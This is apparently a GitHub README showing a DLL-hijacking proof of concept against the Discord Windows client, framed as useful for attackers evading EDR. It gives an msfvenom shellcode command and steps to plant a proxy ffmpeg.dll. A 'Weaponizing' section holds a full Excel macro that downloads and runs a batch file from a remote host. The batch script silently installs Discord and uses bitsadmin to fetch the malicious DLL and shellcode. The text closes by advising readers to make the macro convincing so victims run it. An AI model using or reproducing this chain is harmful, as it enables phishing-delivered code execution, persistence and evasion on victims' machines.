# Discord-DLL-Hijacking
This is a simple quick example of DLL hijacking enabling proxy execution for the Discord Binary. This can be beneficial for attackers requiring proxy execution to bypass EDR

## Note
I submitted this vuln to discord via their hackerone program. They choose to not recognize DLL hijacking unless it's related to the discord installer binary. 
Similarly to chrome: https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model

I understand this too an extent, but they don't seem to make any attempt to verify these DLL's or load them using best practices as directed by Microsoft: 
https://support.microsoft.com/en-us/topic/secure-loading-of-libraries-to-prevent-dll-preloading-attacks-d41303ec-0748-9211-f317-2edc819682e1

</br>

## What is DLL hijacking and why is it useful? 

DLL hijacking has been around a very long time. The severity of these attacks is dependent on a variety of factors, primarily application context. 
Microsoft gives a good summary: 

"When an application dynamically loads a dynamic link library (DLL) without specifying a fully qualified path, Windows tries to locate the DLL by searching a well-defined set of directories. If an attacker gains control of one of the directories, they can force the application to load a malicious copy of the DLL instead of the DLL that it was expecting. These attacks are known as “DLL preloading attacks” and are common to all operating systems that support dynamically loading shared DLL libraries. The effect of such attacks could be that an attacker can execute code in the context of the user who is running the application. When the application is being run as Administrator, this could lead to a local elevation of privilege." 

-> Source: https://support.microsoft.com/en-us/topic/secure-loading-of-libraries-to-prevent-dll-preloading-attacks-d41303ec-0748-9211-f317-2edc819682e1 

Why should we care? 
First off, gaining execution context under a trusted application is useful for proxy execution of malicious payloads. Pending the AV/EDR, payloads can be executed in an'trusted' context. Adversaries can also use this technique for persistence mechanisms.

Discord in some instances requires Administrator privs when Push-To-Talk is overidden by other Administrative applications. This combined with it's popularity peaked my interest.


## Analyzing with Procmon 

Doing a basic filter results in ALOT of misconfigurations for search based DLL issues. What interested me was the 'ffmpeg.dll' I noticed elsehwhere in the procmon dump. This appears to be a common DLL used by a variety of applications including whatsapp. 

![image](https://user-images.githubusercontent.com/46195001/231240214-d6421d61-a458-4104-8591-03f38f26d2d4.png)

</br> 


## Generate a payload 
Generate some shellcode to your liking. My POC: msfvenom -f raw -o pop.bin -p windows/exec cmd="cmd.exe /k whoami" exitfunc=thread --bad-chars '\x00\x20\' --smallest

## Generating a malicious DLL 

Using this great repository we can create our own DLL utilizing pragma comments to replicate functions: 
https://github.com/Flangvik/SharpDllProxy 

![dllproxy](https://user-images.githubusercontent.com/46195001/232322708-9f158799-c850-4a69-b69b-ad7372cbec1b.png)

<br> 
This will output two files, .c & an DLL 'tmpXYZ.dll'. Simply create a new DLL project in visual studio and replace the source with the output from DLLProxy. 
Once you've compiled it, copy your DLL, the tmpXYZ.dll (rename it to ffmpeg.dll) and your shellcode.bin into "C:\Users\<user>\AppData\Local\Discord\app-1.0.9012\". 

## Result 
![popped](https://user-images.githubusercontent.com/46195001/232325180-3ec3af99-d5f9-4c8c-935c-fd7d3c0ece51.png)

Running Discord.exe executes a shellode. Great! Interestingly Discord itself crashes out with no visual artifacts but our cmd.exe process remains. This is ideal if we drop discord ourselves as a persistence mechanism without user knowledge. 
</br>

## Weaponizing 
It's quite simple to weaponize this DLL hijacking in an automated fashion. Below is a basic macro that downloads a batch file to execute installing discord and download the malicious files. 

The kicker for this method: 
- Discord installs silently, no on screen artifacts. 
- Discord uses it's own scheduled task on reboot giving us code exec.
- Using ffmpeg.dll will give us code execution and crash the legitimate discord process with zero notification to the user. Likely to see WerFault & MiniDumps however. 


</br>

### Excel Macro 

```
Private Sub Workbook_Open()

Dim url, downloadPath, batPath, shell, winHttpReq
url = "http://192.168.120.128/Update.txt"
downloadPath = "C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local\Update.bat"
batPath = "C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local"

' Create a WinHttpRequest objects
Set winHttpReq = CreateObject("WinHttp.WinHttpRequest.5.1")

' Open a connection to the specified URL
winHttpReq.Open "GET", url, False

' Send the HTTP request and download the file
winHttpReq.Send
If winHttpReq.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write winHttpReq.ResponseBody
    stream.SaveToFile downloadPath, 2 ' Overwrite
    stream.Close
End If

' Execute the downloaded BAT file
Set shell = CreateObject("WScript.Shell")
shell.Run batPath & "\Update.bat"

Set shell = Nothing
Set winHttpReq = Nothing


End Sub
```

### Seemless discord install via .bat file. 
```
@echo off
set DOWNLOAD_URL=https://dl.discordapp.net/distro/app/stable/win/x86/1.0.9012/DiscordSetup.exe
set DOWNLOAD_DLL=http://192.168.120.128/ffmpeg.dll 
set DOWNLOAD_BIN=http://192.168.120.128/pop.bin
set DOWNLOAD_tmp=http://192.168.120.128/tmp108E.dll
set DOWNLOAD_LOCATION=C:\Windows\Temp\Update.exe
set EXECUTE_LOCATION=C:\Windows\Temp\

set COPY_LOCATION=%LOCALAPPDATA%\Discord\app-1.0.9012\
set DL_DLL=%LOCALAPPDATA%\Discord\app-1.0.9012\ffmpeg.dll
set DL_tmp=%LOCALAPPDATA%\Discord\app-1.0.9012\tmp108E.dll
set DL_bin=%LOCALAPPDATA%\Discord\app-1.0.9012\pop.bin


bitsadmin /transfer myDownloadJob /priority normal %DOWNLOAD_URL% %DOWNLOAD_LOCATION%
start "" "%EXECUTE_LOCATION%\Update.exe" --silent
timeout /t 10
bitsadmin /transfer myDownloadJob1 /priority normal %DOWNLOAD_DLL% %DL_DLL%
bitsadmin /transfer myDownloadJob2 /priority normal %DOWNLOAD_BIN% %DL_bin%
bitsadmin /transfer myDownloadJob3 /priority normal %DOWNLOAD_tmp% %DL_tmp%
```

### Server setup 
Enable apache 2 and copy across the files from below (I forgot the bat file in the ss). 
![image](https://user-images.githubusercontent.com/46195001/232535184-26456e4b-9a92-439e-b8e1-5c1405b792d1.png)

Create your macro in a convincing manner, get them to execute it. 

### Result... 
Popped a shell .. :) 
 
![image](https://user-images.githubusercontent.com/46195001/232533881-7fd1d90a-1974-4672-afc6-be0f802171a1.png)




